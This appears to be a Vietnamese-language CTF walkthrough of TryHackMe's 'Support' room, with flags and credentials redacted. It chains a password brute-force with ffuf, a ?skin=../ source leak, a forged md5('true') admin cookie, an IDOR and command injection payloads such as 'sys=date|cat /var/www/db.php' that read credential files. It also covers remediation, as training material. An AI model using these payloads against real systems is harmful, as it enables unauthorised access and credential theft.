@@ -1,0 +1,214 @@
+---
+title: 'Support'
+description: "Một login helpdesk bị brute-force dẫn đến tham số theme làm lộ source PHP, từ đó lộ ra cookie tin cậy md5('true') có thể giả mạo để lấy flag admin, một IDOR, và một OS command injection mà bằng pipe hoặc dấu chấm phẩy đọc được creds plaintext và flag user."
+date: 2026-05-26
+platform: tryhackme
+room: 'Support'
+roomUrl: 'https://tryhackme.com/room/support'
+difficulty: medium
+tags:
+  - 'web'
+  - 'command-injection'
+  - 'idor'
+  - 'lfi'
+  - 'md5'
+  - 'password-cracking'
+  - 'linux'
+vulnClasses:
+  - 'weak credentials'
+  - 'arbitrary file read'
+  - 'authentication bypass'
+  - 'insecure direct object reference'
+  - 'insecure command execution'
+  - 'cleartext database credentials'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Support — Từ Một Login Bị Brute-Force Đến Cookie Admin Giả Mạo Và Command Injection**
+
+_Bài walkthrough thử thách "Support" trên TryHackMe. Một panel helpdesk gục ngã trước một chuỗi lỗi web nhỏ: một mật khẩu ta brute-force được, một tham số "theme" làm lộ chính source PHP của app, một cookie tin cậy chỉ là_ _`md5('true')`\*\*, một IDOR trong user API nội bộ, và cuối cùng là một OS command injection mà bộ lọc bị vượt qua bằng_ _`|`_ _hoặc_ _`;`\*\*. Hai flag rẽ ra trên đường đi — một từ việc giả mạo cookie admin, một từ việc đọc file qua command injection._
+
+> Cả hai flag và toàn bộ thông tin đăng nhập đã redact. Digest MD5 công khai của hai từ `true`/`false` được giữ lại vì chúng _chính là_ kỹ thuật. Support là phòng huấn luyện hợp pháp trên TryHackMe; mọi thao tác đều thực hiện trên mục tiêu luyện tập hợp pháp. Các giá trị hiển thị dạng `<redacted>` hoặc `THM{<redacted>}` là thật trên máy nhưng được giấu ở đây.
+
+---
+
+### **TL;DR — toàn bộ chuỗi tấn công**
+
+<Callout type="tldr">
+
+`ffuf` brute-force mật khẩu helpdesk cho `help@support.thm` → dashboard mang một cookie tin cậy `isITUser` bằng `md5('false')` → tính năng "Select Theme" (`dashboard.php?skin=`) gọi `readfile()` và, với `?skin=../<name>`, **làm lộ source PHP** của `dashboard.php`, `api.php`, `config.php` → source cho thấy cổng `isITUser !== md5('true') -> die`, một **IDOR**, và một bộ chạy lệnh OS → đặt `isITUser = md5('true')` (**cookie tin cậy giả mạo được**) để mở khóa IT Admin Panel và in ra **flag admin** → `/user/<id>` của API là một **IDOR** (`/user/1` = `specialadmin`, admin) → tham số `sys` của dashboard chạy một lệnh shell; một `|`/`;` **vượt qua bộ lọc** → `sys=date|cat /var/www/db.php` làm lộ creds plaintext và `sys=date|cat /home/ubuntu/user.txt` trả ra **flag user**.
+
+Một mật khẩu đoán được, một rò rỉ source, một cookie giả mạo một dòng, và một command injection.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+```
+
+`nmap -sC -sV` cho thấy SSH và một Apache "Support Operations Panel":
+
+```text
+22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu
+80/tcp open  http  Apache httpd 2.4.58 ((Ubuntu))   |_http-title: Support Operations Panel
+```
+
+Trang web là một panel đăng nhập; `gobuster` tìm thấy `/includes`, `/js`, `/layout`, và `/skins` — cái cuối là manh mối ta sẽ quay lại.
+
+### **Bước 1 — brute-force login helpdesk**
+
+Login cần email + mật khẩu. Biết một địa chỉ helpdesk hợp lý (`help@support.thm`), ta brute-force mật khẩu với `rockyou`, lọc bỏ kích thước của lần đăng nhập thất bại đã biết:
+
+```text
+ffuf -w rockyou.txt -X POST \
+  -d "email=help@support.thm&password=FUZZ" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -u http://$IP -fs 2678
+# <redacted>   [Status: 302, Size: 0]   <- successful login redirect
+```
+
+Đăng nhập đưa ta đến `dashboard.php` — _"Welcome, Helpdesk User"_, một hệ thống quản lý ticket.
+
+### **Lỗ hổng — một tham số theme làm lộ source**
+
+Điều khiển "Select Theme" của dashboard tải lại với `?skin=...`. Đọc chính source của app (qua cùng tham số đó) cho thấy tại sao điều đó nguy hiểm:
+
+```text
+# dashboard.php (leaked via ?skin=../dashboard)
+$isIT = $_COOKIE['isITUser'] ?? md5("false");
+$skin = $_GET['skin'] ?? 'default';
+
+$webRoot  = realpath('/var/www/html/skins');
+$another  = realpath('/var/www/html');
+$requested = realpath($webRoot . '/' . $skin . '.php');
+if ($requested !== false && strpos($requested, $another) === 0) {
+    readfile($requested);   // reads any *.php under the web root
+}
+```
+
+<Callout type="insight">
+
+Hai lỗi thiết kế gặp nhau ở đây. Thứ nhất, `skin` chỉ bị gói trong `/var/www/html`, chứ không trong `/skins`, nên `?skin=../api`, `?skin=../config`, `?skin=../dashboard` **đọc source PHP thô** của từng file (`readfile`, không phải `include`). Thứ hai, source đó trao cho ta chìa khóa: kiểm tra "có phải nhân viên IT không?" chỉ là `isITUser !== md5('true')` — một giá trị do **client** điều khiển. Rò rỉ source cộng với một cookie tin cậy phía client chính là toàn bộ front end.
+
+</Callout>
+
+### **Bước 2 — đọc api.php và config.php**
+
+Với lỗ hổng rò rỉ source ta lấy phần còn lại của app:
+
+```text
+# api.php (via ?skin=../api)
+if (($_COOKIE['isITUser'] ?? md5('false')) !== md5('true')) { die('Access denied'); }
+include('/var/www/db.php');
+$id   = $_GET['id'] ?? $_SESSION['user_id'];   // <- IDOR
+$user = $users[$id] ?? null;
+if (preg_match('#^/user/#', $_SERVER['REQUEST_URI'])) {
+    unset($user['password']); echo json_encode($user, JSON_PRETTY_PRINT);
+}
+
+# config.php (via ?skin=../config)
+$MASTER_PASSWORD = '<redacted>';
+```
+
+Giờ ta biết chính xác cách trông giống nhân viên IT, và rằng `/user/<id>` là một IDOR.
+
+### **Bước 3 — giả mạo cookie IT/admin (và lấy flag admin)**
+
+Cổng so sánh cookie của ta với `md5('true')`. Các digest này không phải bí mật — chúng là MD5 công khai của các chuỗi theo nguyên văn:
+
+```text
+md5('false') = 68934a3e9455fa72420237eb05902327   (the default cookie)
+md5('true')  = b326b5062b2f0e69046810717534cb09   (what the gate wants)
+```
+
+Đặt cookie và tải lại dashboard:
+
+```text
+Cookie: isITUser=b326b5062b2f0e69046810717534cb09
+```
+
+IT Admin Panel xuất hiện, kèm theo một banner _"Administrator Access Confirmed"_ — flag đầu tiên:
+
+```text
+THM{<redacted>}   # admin flag
+```
+
+### **Bước 4 — IDOR trong user API nội bộ**
+
+"View API" (`api.php`) của IT Admin Panel nói một helpdesk user có thể truy vấn profile _của chính mình_ ở `/user/3`. Vì `id` được lấy thẳng từ request, ta có thể duyệt các user khác:
+
+```text
+GET /user/3   ->  { "email": "help@support.thm",        "2FA": false, "admin": false }
+GET /user/1   ->  { "email": "specialadmin@support.thm", "2FA": false, "admin": true  }
+```
+
+`/user/1` là `specialadmin`, một administrator — insecure direct object reference kinh điển.
+
+### **Bước 5 — OS command injection (và flag user)**
+
+Dashboard có một form `sys` nhỏ (một `<select>` có các option chạy `date`). Giá trị được truyền vào một lệnh shell sau một bộ lọc, nhưng một dấu phân tách shell lọt qua — `|` và `;` đều hoạt động. Trước tiên, liệt kê web root:
+
+```text
+POST /dashboard.php
+sys=date|ls
+# -> api.php  config.php  dashboard.php  footer.php  includes
+#    index.php  info.php  js  layout  logout.php  skins
+```
+
+Sau đó đọc file DB được include, nơi lưu mọi credential dưới dạng plaintext:
+
+```text
+sys=date|cat /var/www/db.php
+# $users = [
+#   1 => [ 'email'=>'specialadmin@support.thm', 'password'=>'<redacted>', '2FA'=>false, 'admin'=>true  ],
+#   2 => [ 'email'=>'IT@support.thm',           'password'=>'<redacted>', '2FA'=>false, 'admin'=>false ],
+#   3 => [ 'email'=>'help@support.thm',         'password'=>'<redacted>', '2FA'=>false, 'admin'=>false ],
+# ];
+```
+
+Cuối cùng, đọc flag user thẳng từ đĩa:
+
+```text
+sys=date|cat /home/ubuntu/user.txt
+# THM{<redacted>}   # user flag
+```
+
+Mật khẩu đoán được → rò rỉ source → cookie giả mạo (flag admin) → IDOR → command injection (creds + flag user).
+
+### **Tác động**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). Box chồng năm lỗi web độc lập:
+
+- **Weak credentials** — một mật khẩu helpdesk đoán được từ `rockyou`.
+- **Đọc file tùy ý / rò rỉ source** — tham số `skin` làm lộ mọi file PHP, phơi bày logic và bí mật.
+- **Authentication bypass qua cookie tin cậy giả mạo** — "có phải admin không?" là `md5('true')`, ai cũng đặt được.
+- **IDOR** — `/user/<id>` phơi bày hồ sơ của user khác, kể cả admin.
+- **OS command injection** — tham số `sys` chạy input của attacker, cho đọc file toàn phần (creds DB plaintext) và flag user, tức là thực thi mã từ xa.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+1. **Bắt buộc credential mạnh và rate-limit / lockout** để login không thể bị brute-force.
+2. **Gói theme loader trong một allow-list** các tên skin đã biết; đừng bao giờ truyền input người dùng vào `readfile()`/`realpath()` cho đường dẫn, và giữ nó trong thư mục dự định.
+3. **Ra quyết định tin cậy phía server.** Lưu role/đặc quyền trong một session phía server có ký — không bao giờ là cookie client, càng không phải `md5('true')`.
+4. **Bắt buộc phân quyền ở cấp đối tượng** trên `/user/<id>` để một user chỉ đọc được hồ sơ của chính mình.
+5. **Đừng bao giờ truyền input người dùng vào shell.** Bỏ bộ chạy lệnh, hoặc dùng một lệnh cố định không có đối số do người dùng điều khiển; allow-list thắng mọi blacklist ký tự. Đồng thời ngừng lưu mật khẩu plaintext trong `db.php`.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **Một mật khẩu brute-force được vẫn là cửa trước.** Mọi thứ sau đó đều phụ thuộc vào credential yếu đầu tiên đó.
+- **Rò rỉ source là bộ khuếch đại sức mạnh.** Đọc `api.php`/`config.php` biến việc đoán mò thành một kế hoạch chính xác — cổng cookie và IDOR đã được trao tận tay.
+- **`md5('true')`** **không phải xác thực.** Bất kỳ giá trị nào client đặt và server chỉ so sánh đều giả mạo được theo định nghĩa.
+- **Blacklist ký tự không chặn được command injection.** `|` và `;` đi thẳng qua; chỉ việc bỏ lệnh shell (hoặc một allow-list nghiêm ngặt) mới thực sự vá được.
+
+Cảm ơn bạn đã đọc. Support là một chồng gọn các lỗi web thường ngày — mật khẩu yếu, rò rỉ source, tin cậy phía client, IDOR, command injection — mỗi cái nhỏ, gộp lại quá đủ để chiếm box tới hai lần.
